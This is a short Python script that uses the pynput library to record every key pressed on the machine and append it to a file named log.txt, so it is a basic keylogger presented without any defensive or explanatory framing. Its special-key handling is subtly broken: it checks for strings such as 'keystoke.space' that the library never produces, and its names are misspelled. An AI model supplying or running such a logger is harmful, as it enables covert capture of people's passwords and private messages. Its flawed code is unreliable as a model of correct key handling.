from pynput.keyboard import Listener

def log_keystokestroke(keystoke):
    keystoke = str(keystoke).replace("'", "")

    if keystoke == 'keystoke.space':
        keystoke = ' '
    if keystoke == 'keystoke.shift_r':
        keystoke = ''
    if keystoke == "keystoke.enter":
        keystoke = '\n'

    with open("log.txt", 'a') as file:
        file.write(keystoke)

with Listener(on_press=log_keystokestroke) as lis:
    lis.join()